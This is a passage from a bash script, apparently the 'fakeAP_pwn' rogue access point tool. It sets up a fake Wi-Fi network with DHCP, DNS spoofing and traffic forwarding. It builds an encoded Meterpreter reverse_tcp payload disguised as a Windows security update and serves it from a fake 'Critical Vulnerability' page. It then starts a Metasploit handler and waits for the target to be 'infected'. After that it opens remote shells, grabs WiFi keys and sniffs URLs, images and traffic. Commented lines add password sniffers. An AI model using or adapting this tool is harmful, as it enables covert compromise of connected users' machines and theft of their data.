#wmm_ac_be_cwmin=4
#wmm_ac_be_cwmax=10
#wmm_ac_be_txop_limit=0
#wmm_ac_be_acm=0
#wmm_ac_vi_aifs=2
#wmm_ac_vi_cwmin=3
#wmm_ac_vi_cwmax=4
#wmm_ac_vi_txop_limit=94
#wmm_ac_vi_acm=0
#wmm_ac_vo_aifs=2
#wmm_ac_vo_cwmin=2
#wmm_ac_vo_cwmax=3
#wmm_ac_vo_txop_limit=47
#wmm_ac_vo_acm=0
#enable_karma=1 # uncomment this line if you patched hostapd with karma
#accept_mac_file=/etc/hostapd/hostapd.accept
#deny_mac_file=/etc/hostapd/hostapd.deny" >> $path
   if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
   if [ "$debug" == "true" ] ; then cat $path; fi
   if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
   #display faction "Creating exploit.(Linux)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"; fi
   #xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"
   #display action "Creating exploit..(OSX)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"; fi
   #xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"
   display action "Creating: Exploit (Windows)" $diagnostics
   if [ ! -e "$www/sbd.exe" ] ; then display error "sbd.exe is not in $www" $diagnostics 1>&2; cleanup; fi
   if [ -e "$www/Windows-KB183905-x86-ENU.exe" ]; then rm "$www/Windows-KB183905-x86-ENU.exe"; fi
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
   #action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
   sleep 1
   if [ ! -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then display error "Failed: Couldn't create exploit" $diagnostics 1>&2; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: Access point" $diagnostics
if [ "$apType" == "airbase-ng" ] ; then
   loopMain="False"
   i="1"
   for i in {1..3} ; do # Main Loop
      killall airbase-ng 2>/dev/null # Start fresh
      sleep 1
      command="airbase-ng -a $macAddress -W 0 -c $channel -e \"$ESSID\"" # taken out y (try w,a)
      if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
      if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then command="$command -v"; fi
      action "Access Point" "$command $monitorInterface" $verbose $diagnostics "true" "0|0|4" & # Don't wait, do the next command
      sleep 3
      ifconfig $apInterface up                                       # The new ap interface
      command=$(ifconfig -a | grep $apInterface | awk '{print $1}')
      if [ "$command" != "$apInterface" ] ; then
         display error "Couldn't create the access point's interface." $diagnostics 1>&2
      else
         #if [ "$diagnostics" != "true" ] || [ "$debug" != "true" ]  ; then loopMain="True"; break; fi  # Not in the correct mode
         #if [ "$mode" == "non" ] ; then loopMain="non"; break; fi                 # Not using $interface therefore can't test.
         command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
         if [ ! $command ]; then loopMain="True"; break; fi                          # $interface isn't WiFi, therefore can't test.
         display diag "Attempt #$i to detect the 'fake' access point." $diagnostics
         loopSub="False"
         x="1"
         for x in {1..5} ; do # Subloop
            display diag "Scanning access point (Scan #$x)" $diagnostics
            testAP $ESSID $interface
            return_val=$?
            if [ "$return_val" -eq "0" ] ; then loopSub="True"; break; # Sub loop
            elif [ "$return_val" -eq "1" ] ; then display error "Coding error" $diagnostics ;
            elif [ "$return_val" -eq "2" ] ; then display error "Couldn't detect a single access point" $diagnostics ;
            elif [ "$return_val" -eq "3" ] ; then display error "Couldn't find the 'fake' access point" $diagnostics ;
            else display error "Unknown error." $diagnostics ; fi
            sleep 1
         done # Subloop
         if [ $loopSub == "True" ] ; then
            display info "Detected the 'fake' access point! ($ESSID)" $diagnostics
            loopMain="True"
            break; # MainLoop
         fi
      fi
      if [ -z "$(pgrep airbase-ng)" ] ; then
         display error "airbase-ng failed to start." $diagnostics 1>&2
         if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi;
         cleanup
      fi
      sleep 3
   done # MainLoop
   if [ $loopMain == "False" ] ; then
      display error "Couldn't detect the 'fake' access point." $diagnostics 1>&2
   fi
elif [ "$apType" == "hostapd" ] ; then
   action "'Fake' Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" $verbose $diagnostics "true" "0|0|4" & # Don't wait, do the next command
   sleep 3
   if [ -z "$(pgrep hostapd)" ] ; then
      display error "hostapd failed to start." $diagnostics 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
      cleanup
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring: Environment" $diagnostics
ifconfig lo up
ifconfig $apInterface 10.0.0.1 netmask 255.255.255.0
ifconfig $apInterface mtu $mtu
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
echo "1" > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ $command != "1" ] ; then display error "Can't enable ip_forward" $diagnostics 1>&2 ; cleanup ; fi
echo "1" > /proc/sys/net/ipv4/conf/$interface/forwarding
echo "1" > /proc/sys/net/ipv4/conf/$wifiInterface/forwarding
echo "1" > /proc/sys/net/ipv4/conf/$apInterface/forwarding
if   [ "$mode" == "normal" ] ; then ipTables transparent $verbose $diagnostics $apInterface $interface $gatewayIP
elif [ "$mode" == "flip" ] ; then ipTables squid $verbose $diagnostics $apInterface $interface
elif [ "$mode" == "non" ] || [ "$mode" == "transparent" ] ; then ipTables force $verbose $diagnostics $apInterface
fi

if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Configuring: Permissions" $diagnostics ; fi
action "DHCP" "chmod 775 /var/run/" $verbose $diagnostics "true"
action "DHCP" "touch /var/lib/dhcp3/dhcpd.leases" $verbose $diagnostics "true"
if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then # ubuntu - Fixes folder persmissions
   mv "/etc/dhcp3/dhcpd.conf" "/etc/dhcp3/dhcpd.conf.bkup"
   ln "/tmp/fakeAP_pwn.dhcp"  "/etc/dhcp3/dhcpd.conf"
fi
if [ "$mode" == "flip" ] ; then
   mkdir -p "$www/images"
   action "DHCP" "chmod 755 /tmp/fakeAP_pwn.pl" $verbose $diagnostics "true"
   action "DHCP" "chmod 755 $www/images" $verbose $diagnostics "true"
   action "DHCP" "chown proxy:proxy $www/images" $verbose $diagnostics "true"
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: DHCP" $diagnostics
if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then command="dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf $apInterface"
else command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" ;
fi
action "DHCP" "$command" $verbose $diagnostics "true" "0|75|5" & # -d = logging, -f = forground # Don't wait, do the next command
sleep 2
if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
   display error "DHCP server failed to start." $diagnostics 1>&2
   if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
   display action "Starting: DNS" $diagnostics
   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" "0|165|5" & # Don't wait, do the next command
   sleep 2
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "normal" ] &&  [ "$mode" != "flip" ] ; then
   display action "Starting: Metasploit" $diagnostics
   command=$(netstat -ltpn | grep 4565)
   if [ "$command" != "" ] ; then
      display error "Port 4564 isn't free." $diagnostics 1>&2 ;
      command=$(pgrep ruby)
      action "Killing ruby" "kill $command" $verbose $diagnostics "true" # to prevent interference
      sleep 1
      command=$(netstat -ltpn | grep 4565)
      if [ "$command" != "" ] ; then display error "Couldn't free port 4564." $diagnostics 1>&2 ; cleanup; fi # Kill it for them?
   fi
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" $verbose $diagnostics "true" "0|255|15" & #ExitOnSession=false # Don't wait, do the next command
   sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download
   if [ -z "$(pgrep ruby)" ] ; then
      display error "Metaspliot failed to start." $diagnostics 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
      cleanup
   fi
fi
if [ "$mode" == "flip" ] ; then
   display action "Starting: Squid" $diagnostics
   action "squid" "squid -f /tmp/fakeAP_pwn.squid" $verbose $diagnostics "true"
   sleep 3
   if [ -z "$(pgrep squid)" ] ; then
      squid -f /tmp/fakeAP_pwn.squid # *** NEED A FIX ***
   fi
   sleep 3
   if [ -z "$(pgrep squid)" ] ; then
       display error "squid failed to start." $diagnostics 1>&2
       if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
       cleanup
   fi
fi
if [ "$mode" != "normal" ] ; then
#----------------------------------------------------------------------------------------------#
   display action "Starting: Web server" $diagnostics
   if [ ! -e "/etc/ssl/private/ssl-cert-snakeoil.key" ] ; then
      display error "Need to renew certificate" $diagnostics ;
      openssl genrsa -out server.key 1024
      openssl req -new -x509 -key server.key -out server.pem -days 1826
      mv -f "server.key" "/etc/ssl/private/ssl-cert-snakeoil.key"
      mv -f "server.pem" "/etc/ssl/certs/ssl-cert-snakeoil.pem"
   fi
   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" $verbose $diagnostics "true" & #dissable all sites and only enable the fakeAP_pwn one # Don't wait, do the next command
   sleep 2
   if [ -z "$(pgrep apache2)" ] ; then
      display error "Apache2 failed to start." $diagnostics 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi ; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> $logFile; fi
      cleanup
   fi
   if [ "$diagnostics" == "true" ] ; then
      sleep 3
      display diag "Testing: Web server" $diagnostics
      command=$(wget -qO- "http://10.0.0.1" | grep "<title>Critical Vulnerability - Update Required</title>")
      if [ "$command" != "" ] ; then
         echo "-->Web server: Okay" >> $logFile
      else
         display error "Web server: Failed" $diagnostics 1>&2 ;
         echo "-->Web server: Failed" >> $logFile
         wget -qO- "http://10.0.0.1" >> $logFile
      fi
   fi
fi

if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "vnc" ] ; then
      display action "Configuring: VNC" $diagnostics
      action "VNC" "vncviewer -listen -compresslevel 4 -quality 4" $verbose $diagnostics "true" "0|565|10" & # Don't wait, do the next command
   elif [ "$payload" == "sbd" ] ; then
      display action "Configuring: SBD" $diagnostics
      action "SBD" "sbd -l -k g0tmi1k -p $port" $verbose $diagnostics "true" "0|565|10" & # Don't wait, do the next command
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then
      display action "Monitoring connections" $diagnostics
      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "false" "0|475|5" & # Don't wait, do the next command
   fi
   display info "Waiting for the target to run the \"update\" file" $diagnostics # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
   if [ -e "/tmp/fakeAP_pwn.lock" ] ; then rm -r "/tmp/fakeAP_pwn.lock" ; fi
   while [ ! -e "/tmp/fakeAP_pwn.lock" ] ; do
      sleep 5
   done

#----------------------------------------------------------------------------------------------#
   display info "Target infected!" $diagnostics
   if [ "$diagnostics" == "true" ] ; then echo "-Target infected!------------------------" >> $logFile; fi
   targetIP=$(arp -n -v -i $apInterface | grep $apInterface | awk -F " " '{print $1}')
   if [ "$verbose" != "0" ] ; then display info "Target's IP = $targetIP" $diagnostics ; fi; if [ "$diagnostics" == "true" ] ; then echo "Target's IP = $targetIP" >> $logFile; fi

#----------------------------------------------------------------------------------------------#
   if [ "$mode" == "transparent" ] ; then
      display action "Grainting internet access" $diagnostics
      ipTables transparent $verbose $diagnostics $apInterface $interface $gatewayIP
      sleep 1
   fi

#----------------------------------------------------------------------------------------------#
   if [ "$payload" == "wkv" ] ; then
      if [ ! -e "/tmp/fakeAP_pwn.wkv" ] ; then
         display error "Failed: Didn't download WiFi keys." $diagnostics
      else
         display action "Opening: WiFi Keys" $diagnostics
         action "WiFi Keys" "cat /tmp/fakeAP_pwn.wkv" $verbose $diagnostics "false" "0|565|10" "hold" & sleep 1
      fi
   fi

#----------------------------------------------------------------------------------------------#
else
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then
      display action "Monitoring connections" $diagnostics
      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "false" "0|475|5" & # Don't close! We want to view this!
      sleep 1
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$extras" == "true" ] ; then
   display action "Caputuring: information from the target" $diagnostics
   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" $verbose $diagnostics "true" 650 640 10 & # Dump all trafic into a file # Don't wait, do the next command
   action "URLs" "urlsnarf -i $apInterface" $verbose $diagnostics "true" "0|0|10" & # URLs # Don't wait, do the next command
   action "Images" "driftnet -i $apInterface" $verbose $diagnostics "true" "0|465|10" & # Don't wait, do the next command
   #ipTables sslstrip $verbose $diagnostics
   #command="sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> $logFile; fi
   #$xterm -geometry 0x0+0+0 -T "fakeAP_pwn v$version - SSLStrip" -e "$command" &            # SSLStrip
   #command="dsniff -i $apInterface -w /tmp/fakeAP_pwn.dsniff"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> $logFile; fi
   #$xterm -geometry 75x10+10+155  -T "fakeAP_pwn v$version - Passwords" -e "$command" &     # Passwords
   #command="ettercap -T -q -p -i $apInterface // //"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> $logFile; fi
   #$xterm -geometry 75x10+460+155 -T "fakeAP_pwn v$version - Passwords (2)" -e "$command" & # Passwords (again)
   #command="msgsnarf -i $apInterface"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> $logFile; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM" -e "$command" &            # IM
   #command="imsniff $apInterface"
   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> $logFile; fi
   #$xterm -geometry 75x10+10+310  -T "fakeAP_pwn v$version - IM (2)" -e "$command" &        # IM (again)
   sleep 1
fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" == "normal" ] || [ "$mode" == "flip" ] ; then
   display info "Ready! ...press CTRL+C to stop" $diagnostics
   if [ "$diagnostics" == "true" ] ; then echo "-Ready!----------------------------------" >> $logFile ; fi
   for (( ; ; )) ; do
      sleep 5
   done
fi

#----------------------------------------------------------------------------------------------#
if [ "$diagnostics" == "true" ] ; then echo "-Done!---------------------------------------------------------------------------------------" >> $logFile ; fi
cleanup clean


#---Roadmap------------------------------------------------------------------------------------#
# v0.4 - Multiple clients       - Each time a new client connects they will be redirected to our
#                                  crafted page without affecting any other clients who are browsing
# v0.4 - Firewall Rules         - Don't expose local machines from the internet interface
# v0.5 - Java exploit           - Different "delivery system" ;)
# v0.6 - Linux/OSX/x64          - Make compatible
# v0.7 - Clone AP               - Copies SSID & BSSID aftwards kicks connected client(s)
# v0.8 - S.E.T. & karmetasploit - Use "Social Engineering Toolkit" and or karmetasploit
#---Ideas--------------------------------------------------------------------------------------#
# Add: Beep on connected client
# Add: Check 'extra' programs
# Add: Download missing files
# Add: Generate index php, vnc.reg & embed images
# Add: Monitor traffic that isn't on port 80 before they download the payload
# Add: New modes - replace exe, kill, cookie, inject, redirect
# Add: Port check
# Add: Repo that has all the software in
# Add: Update airbase/airbase-ng & Update at start-up
# Add: VNC "spy" option
# Check: Monitor interface from "monitor mode enabled on xxx"
# Check: MTU
# Check: other monitor interfaces
# Check: VNC
# Use: netsh advfirewall firewall add rule name="allow TightVNC" dir=in program="C:\\winvnc.exe" security=authenticate action=allow
# Use: vnc.rb in metasploit?
# Use: Re look at index.php - dont use http://10.0.0.1/[Filename]